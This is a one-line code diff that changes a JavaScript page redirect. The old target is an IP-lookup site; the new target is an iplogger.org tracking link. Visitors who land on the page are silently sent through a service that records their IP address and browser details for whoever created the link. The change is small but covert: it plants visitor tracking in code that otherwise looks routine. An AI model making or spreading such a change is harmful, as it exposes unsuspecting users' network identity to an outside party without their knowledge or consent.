@@ -1,1 +1,1 @@
-window.location.replace("https://whatismyipaddress.com");
+window.location.replace("https://iplogger.org/2Y2ba6");
